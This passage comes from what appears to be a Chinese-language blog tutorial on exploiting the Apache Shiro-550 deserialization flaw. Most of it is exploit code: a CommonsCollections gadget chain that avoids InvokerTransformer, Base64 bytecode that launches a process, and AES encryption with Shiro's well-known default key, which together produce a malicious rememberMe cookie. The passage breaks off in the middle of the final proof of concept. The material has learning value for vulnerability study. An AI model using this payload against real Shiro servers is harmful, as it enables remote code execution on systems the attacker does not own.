ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(com.govuln.shiroattack.Evil<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = <span class="keyword">new</span> CommonsCollectionsShiro().getPayload(clazz.toBytecode());</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+这里用到了javassist，这是一个字节码操纵的第三方库，可以帮助将恶意类Evil(P师傅项目内)生成字节码再交给<code>TemplatesImpl</code>(ysoserial中也用到了这个第三方库)。将生成的poc在Cookie里进行发送，弹出计算器。<br><img src="https://s2.loli.net/2021/12/07/n5UeQiAZabMumVC.png" alt="1.png"><br>这个Gadget其实就是XRay和Koalr师傅的CommonsCollectionsK1用来检测Shiro550的方法。<strong>P师傅总结</strong>，这一篇看似在介绍Shiro反序列化漏洞，实际上介绍了如何将TemplatesImpl结合到CommonsCollections6中，也就解决了上一篇说到的不能在Java 8u71后利用的问题。但是，Shiro反序列化的故事其实还没有完，在后面介绍完CommonsBeanutils利用链后，我们还会再遇到Shiro，这里先留个小伏笔。另外，下一章也不是CommonsBeanutils，因为CommonsCollections还有个大坑没有补完，那就是CommonsCollections4。<h2 id="最后补充几点"><a href="#最后补充几点" class="headerlink" title="最后补充几点"></a>最后补充几点</h2></li>
+<li>Shiro不是遇到Tomcat就一定会有这个数组问题</li>
+<li>Shiro-550的修复不意味着反序列化漏洞的修复，只是默认Key移除了</li>
+<li>网上大部分文章上来就是装一个commons-Collections4.0，这是没有代表性的，不建议将这两者结合起来学习。<h2 id="不使用InvokerTransformer的版本"><a href="#不使用InvokerTransformer的版本" class="headerlink" title="不使用InvokerTransformer的版本"></a>不使用InvokerTransformer的版本</h2>先给出调用链<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject</span><br><span class="line">    HashMap#hash</span><br><span class="line">        TiedMapEntry#hashCode</span><br><span class="line">            TiedMapEntry#getValue</span><br><span class="line">                LazyMap#get</span><br><span class="line">                    InstantiateTransformer#transform</span><br><span class="line">                        TrAXFilter#TrAXFilter</span><br><span class="line">                            Templates#newTransformer</span><br><span class="line">                                ...</span><br></pre></td></tr></table></figure>
+上一篇其实说到了<code>InvokerTransformer</code>这个类被过滤，所以才有了CC3的出现，也就是为了绕过对于<code>InvokerTransformer</code>的过滤。P师傅给出的poc中使用了<code>InvokerTransformer</code>，但是经过P师傅这么多篇的教导，其实可以自己改造一个不使用<code>InvokerTransformer</code>的poc。<br>首先是把TemplatesImpl写出来<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] code =</span><br><span class="line">                Base64.getDecoder().decode(<span class="string">"yv66vgAAADQALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAbSGVsbG9UZW1wbGF0ZXNJbXBsRGVtby5qYXZhDAARABIHACQMACUAJgEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHACcMACgAKQcAKgwAKwAsAQAIY2FsYy5leGUMAC0ALgEAFkhlbGxvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAIAAkAAAAAAAMAAQAKAAsAAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAAAkADgAAAAQAAQAPAAEACgAQAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAALAA4AAAAEAAEADwABABEAEgACAAwAAAA6AAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAQANAAAAEgAEAAAADQAEAA4ADAAQABUAEQAOAAAABAABABMAAQAUAAAAAgAV"</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br></pre></td></tr></table></figure>
+然后这里使用的是TrAXFilter和InstantiateTransformer的组合，这里的目标是想办法执行TrAXFilter的构造函数从而调用其中的newTransformer函数。模仿上面的例子，将TrAXFilter.class作为TiedMapEntry的key即可代替ConstantTransformer的作用，所以不需要Transformer数组。接下来是LazyMap的设置，由于在后面<code>HashMap#put</code>的时候会触发一次Gadget，所以这里为了防止Payload在构造序列化数据的时候执行需要先给LazyMap的factory设置一个无害的东西，这里选用了ConstantTransformer(1)。最后再把TiedMapEntry作为HashMap的key，即可连上之前CC6的调用链，然后clear，清空掉outerMap的key。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//Transformer transformerChain = new ChainedTransformer(fakeTransformers);</span></span><br><span class="line">        <span class="comment">//将这个设置为无害</span></span><br><span class="line">        <span class="comment">//Transformer transformer = new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;obj&#125;);</span></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, TrAXFilter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        expMap.put(tme, <span class="string">"something"</span>);</span><br><span class="line">        outerMap.clear();</span><br></pre></td></tr></table></figure>
+最后在生成反序列化数据前，别忘了把真正调用字节码的部分设置进去，这里用反射设置一下LazyMap的factory属性。这样在触发InstantiateTransformer的transform方法的时候会调用到TrAXFilter的构造函数，从而调用到<code>TemplatesImpl#newTransformer</code><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过反射设置ChainedTransformer对象的iTransformers属性</span></span><br><span class="line"></span><br><span class="line">Field f = LazyMap.class.getDeclaredField("factory");</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">f.set(outerMap, new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;obj&#125;));</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<hr>
+<p>完整的本地测试poc如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollectionsShiroBypass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] code =</span><br><span class="line">                Base64.getDecoder().decode(<span class="string">"yv66vgAAADQALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAbSGVsbG9UZW1wbGF0ZXNJbXBsRGVtby5qYXZhDAARABIHACQMACUAJgEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHACcMACgAKQcAKgwAKwAsAQAIY2FsYy5leGUMAC0ALgEAFkhlbGxvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAIAAkAAAAAAAMAAQAKAAsAAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAAAkADgAAAAQAAQAPAAEACgAQAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAALAA4AAAAEAAEADwABABEAEgACAAwAAAA6AAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAQANAAAAEgAEAAAADQAEAA4ADAAQABUAEQAOAAAABAABABMAAQAUAAAAAgAV"</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        </span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//Transformer transformerChain = new ChainedTransformer(fakeTransformers);</span></span><br><span class="line">        <span class="comment">//将这个设置为无害</span></span><br><span class="line">        <span class="comment">//Transformer transformer = new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;obj&#125;);</span></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, TrAXFilter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">"something"</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        <span class="comment">// 通过反射设置ChainedTransformer对象的iTransformers属性</span></span><br><span class="line"></span><br><span class="line">        Field f = LazyMap.class.getDeclaredField("factory");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(outerMap, new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;obj&#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成序列化字符串</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 本地测试</span></span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object obj1 = ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行上面的本地测试poc，成功弹出计算器。<br><img src="https://s2.loli.net/2021/12/07/qxjy5rXnacf1k4p.png" alt="1.png"><br>但是既然这一篇的主题是攻击Shiro，那么最后再改一下，生成能攻击Shiro的Base64编码数据。这里抄一下P师傅加密部分，然后把序列化后的数据以比特数组的形式传入。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line"><span class="keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br><span class="line"></span><br><span class="line">ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">System.out.printf(ciphertext.toString());</span><br></pre></td></tr></table></figure>
+<p>最终的POC如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollectionsShiroBypass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="keyword">byte</span>[] code =</span><br><span class="line">                Base64.getDecoder().decode(<span class="string">"yv66vgAAADQALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAbSGVsbG9UZW1wbGF0ZXNJbXBsRGVtby5qYXZhDAARABIHACQMACUAJgEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHACcMACgAKQcAKgwAKwAsAQAIY2FsYy5leGUMAC0ALgEAFkhlbGxvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAIAAkAAAAAAAMAAQAKAAsAAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAAAkADgAAAAQAAQAPAAEACgAQAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAALAA4AAAAEAAEADwABABEAEgACAAwAAAA6AAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAQANAAAAEgAEAAAADQAEAA4ADAAQABUAEQAOAAAABAABABMAAQAUAAAAAgAV"</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;obj&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//Transformer transformerChain = new ChainedTransformer(fakeTransformers);</span></span><br><span class="line">        <span class="comment">//将这个设置为无害</span></span><br><span class="line">        <span class="comment">//Transformer transformer = new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;obj&#125;);</span></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, TrAXFilter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">"something"</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        <span class="comment">// 通过反射设置ChainedTransformer对象的iTransformers属性</span></span><br><span class="line"></span><br><span class="line">        Field f = LazyMap.class.getDeclaredField("factory");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(outerMap, new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;obj&#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成序列化字符串</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"><span 